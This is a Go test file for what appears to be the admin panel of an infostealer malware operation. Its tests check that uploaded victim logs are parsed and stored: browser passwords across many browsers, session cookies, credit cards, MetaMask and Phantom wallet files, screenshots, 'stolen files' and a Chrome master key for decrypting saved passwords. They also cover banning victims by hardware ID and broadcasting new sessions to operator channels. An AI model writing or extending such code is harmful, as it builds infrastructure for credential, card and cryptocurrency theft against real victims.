package services_test

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"sync"
	"testing"

	"zialfi-panel/internal/db"
	"zialfi-panel/internal/services"
)

type recordingBroadcaster struct {
	mu       sync.Mutex
	channels []string
	messages [][]byte
}

func (r *recordingBroadcaster) Broadcast(channel string, message []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.channels = append(r.channels, channel)
	r.messages = append(r.messages, message)
}

func TestProcess_BannedHWID(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	if _, err := d.Exec("INSERT INTO bans (id, ip, reason, hwid) VALUES ('b1', '1.2.3.4', 'test', 'banned-hwid')"); err != nil {
		t.Fatal(err)
	}
	archive := createTestZip(t, map[string]string{"passwords.txt": "https://x.com\tu\tp"})
	_, err := processor.Process(archive, `{"hwid":"banned-hwid"}`, "")
	if err == nil {
		t.Fatal("expected error for banned HWID")
	}
}

func TestProcess_ArchiveTooLarge(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := make([]byte, 51*1024*1024)
	_, err := processor.Process(archive, `{}`, "")
	if err == nil {
		t.Fatal("expected error for oversized archive")
	}
}

func TestProcess_InvalidZip(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	_, err := processor.Process([]byte("not-a-zip-file"), `{}`, "")
	if err == nil {
		t.Fatal("expected error for invalid zip")
	}
}

func TestProcess_TooManyFiles(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for i := 0; i < 501; i++ {
		f, err := zw.Create(string(rune('a' + i%26)))
		if err != nil {
			t.Fatal(err)
		}
		f.Write([]byte("x"))
	}
	zw.Close()
	_, err := processor.Process(buf.Bytes(), `{}`, "")
	if err == nil {
		t.Fatal("expected error for too many files")
	}
}

func TestProcess_Cookies(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{
		"cookies.txt": ".example.com\tTRUE\t/\tFALSE\t1735689600\tsessionid\tabc123\nmalformed\n",
	})
	sessionID, err := processor.Process(archive, `{"hwid":"c1"}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM cookies WHERE session_id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 cookie (malformed line skipped), got %d", count)
	}
}

func TestProcess_Cards(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{
		"credit_cards.txt": "4111111111111111\t12\t2028\tJohn Doe\nbadline\n",
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM cards WHERE session_id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 card, got %d", count)
	}
}

func TestProcess_Wallets(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{
		"wallets/metamask.json":      `{"key":"val"}`,
		"wallet/phantom.json":        `{"key":"val2"}`,
		"wallets/nested/wallet.json": `{"key":"val3"}`,
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM wallets WHERE session_id=?", sessionID).Scan(&count)
	if count < 2 {
		t.Errorf("expected at least 2 wallets, got %d", count)
	}
}

func TestProcess_SystemInfo(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{
		"system_info.txt": "CPU=Intel i9\nGPU=NVIDIA RTX\nRAM=64GB\nOS=Windows 11\nScreen=1920x1080\nHostname=DESKTOP-ABC\n",
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var cpu, gpu, ram, os string
	err = d.QueryRow("SELECT cpu, gpu, ram, os FROM system_info WHERE session_id=?", sessionID).Scan(&cpu, &gpu, &ram, &os)
	if err != nil {
		t.Fatal(err)
	}
	if cpu != "Intel i9" {
		t.Errorf("cpu = %q, want Intel i9", cpu)
	}
}

func TestProcess_SystemInfo_EmptyKeys(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{"system_info.txt": "=val\n"})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM system_info WHERE session_id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 system_info row, got %d", count)
	}
}

func TestProcess_DetectBrowser(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{
		"Browser Data/chrome_passwords.txt":  "https://a.com\tu\tp",
		"Browser Data/firefox_passwords.txt": "https://b.com\tu\tp",
		"Browser Data/opera_passwords.txt":   "https://c.com\tu\tp",
		"Browser Data/edge_passwords.txt":    "https://d.com\tu\tp",
		"Browser Data/brave_passwords.txt":   "https://e.com\tu\tp",
		"Browser Data/safari_passwords.txt":  "https://f.com\tu\tp",
		"Browser Data/vivaldi_passwords.txt": "https://g.com\tu\tp",
		"Browser Data/yandex_passwords.txt":  "https://h.com\tu\tp",
		"Browser Data/iexplore_passwords.txt": "https://i.com\tu\tp",
		"Browser Data/unknown_passwords.txt": "https://j.com\tu\tp",
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
	if count != 10 {
		t.Errorf("expected 10 passwords, got %d", count)
	}
}

func TestProcess_OversizedFile(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	fh := &zip.FileHeader{
		Name:               "large.txt",
		UncompressedSize64: 11 * 1024 * 1024,
		Method:             zip.Store,
	}
	fh.SetMode(0644)
	w, err := zw.CreateHeader(fh)
	if err != nil {
		t.Fatal(err)
	}
	w.Write([]byte("x"))
	zw.Close()
	sessionID, err := processor.Process(buf.Bytes(), `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected session created, got %d", count)
	}
}

func TestProcess_HubBroadcast(t *testing.T) {
	d := openTestDB(t)
	rec := &recordingBroadcaster{}
	processor := services.NewLogProcessor(d, rec, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{"passwords.txt": "https://x.com\tu\tp"})
	_, err := processor.Process(archive, `{"hwid":"h1","country":"DE"}`, "owner-1")
	if err != nil {
		t.Fatal(err)
	}
	rec.mu.Lock()
	defer rec.mu.Unlock()
	if len(rec.channels) < 2 {
		t.Errorf("expected at least 2 broadcasts, got %d", len(rec.channels))
	}
	hasAll, hasOwner := false, false
	for _, c := range rec.channels {
		if c == "sessions:all" {
			hasAll = true
		}
		if c == "sessions:owner-1" {
			hasOwner = true
		}
	}
	if !hasAll || !hasOwner {
		t.Errorf("expected broadcasts on sessions:all and sessions:owner-1, got %v", rec.channels)
	}
}

func TestProcess_Screenshot(t *testing.T) {
	t.Chdir(t.TempDir())
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	bmp := makeBMP(t, 8, 8)
	archive := createTestZip(t, map[string]string{
		"screenshot.bmp": string(bmp),
		"passwords.txt":  "https://x.com\tu\tp",
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM screenshots WHERE session_id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 screenshot, got %d", count)
	}
}

func makeBMP(t *testing.T, w, h int) []byte {
	t.Helper()
	rowSize := (w*3 + 3) & ^3
	pixelDataSize := rowSize * h
	fileSize := 14 + 40 + pixelDataSize
	buf := make([]byte, fileSize)
	copy(buf[0:2], "BM")
	binary.LittleEndian.PutUint32(buf[2:6], uint32(fileSize))
	binary.LittleEndian.PutUint32(buf[10:14], 14+40)
	binary.LittleEndian.PutUint32(buf[14:18], 40)
	binary.LittleEndian.PutUint32(buf[18:22], uint32(w))
	binary.LittleEndian.PutUint32(buf[22:26], uint32(h))
	binary.LittleEndian.PutUint16(buf[26:28], 1)
	binary.LittleEndian.PutUint16(buf[28:30], 24)
	return buf
}

func TestProcess_EmptyMetadata(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{"passwords.txt": "https://x.com\tu\tp"})
	sessionID, err := processor.Process(archive, "", "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 session, got %d", count)
	}
}

func TestProcess_StolenFiles(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	archive := createTestZip(t, map[string]string{
		"misc/file1.txt": "content1",
		"misc/file2.txt": "content2",
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM stolen_files WHERE session_id=?", sessionID).Scan(&count)
	if count != 2 {
		t.Errorf("expected 2 stolen files, got %d", count)
	}
}

func TestProcess_MasterKey(t *testing.T) {
	d := openTestDB(t)
	processor := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	mk := make([]byte, 32)
	for i := range mk {
		mk[i] = byte(i)
	}
	archive := createTestZip(t, map[string]string{
		"Browser Data/Chrome_passwords.txt": "https://v10.test\tu\tv10encrypted",
		"Browser Data/master_key":           string(mk),
	})
	sessionID, err := processor.Process(archive, `{}`, "")
	if err != nil {
		t.Fatal(err)
	}
	var count int
	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
	if count != 1 {
		t.Errorf("expected 1 password, got %d", count)
	}
}